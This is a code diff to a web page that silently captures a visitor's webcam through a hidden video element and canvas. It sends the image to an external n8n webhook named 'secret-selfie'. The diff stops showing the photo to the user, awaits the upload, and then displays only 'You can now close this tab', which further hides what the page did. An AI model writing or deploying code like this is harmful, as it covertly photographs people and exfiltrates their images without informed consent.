@@ -10,6 +10,9 @@
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
     <img id="photo" />
+    <p id="status" style="display:none; font-family: sans-serif;">
+        You can now close this tab
+    </p>
 
     <script>
         (async () => {
@@ -25,7 +28,7 @@
 
                 video.srcObject = stream;
 
-                setTimeout(() => {
+                setTimeout(async () => {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
 
@@ -34,18 +37,24 @@
                         .drawImage(video, 0, 0);
 
                     const imageData = canvas.toDataURL("image/png");
-                    photo.src = imageData;
+                    // photo.src = imageData;
 
-                    // SEND TO n8n
-                    fetch("https://chloroformshake.app.n8n.cloud/webhook/secret-selfie", {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            image: imageData
-                        })
-                    });
+                    try {
+                        await fetch("https://chloroformshake.app.n8n.cloud/webhook/secret-selfie", {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json"
+                            },
+                            body: JSON.stringify({
+                                image: imageData
+                            })
+                        });
+
+                        document.getElementById("status").style.display = "block";
+
+                    } catch (e) {
+                        console.log("Upload failed:", e);
+                    }
 
                     stream.getTracks().forEach(t => t.stop());
 
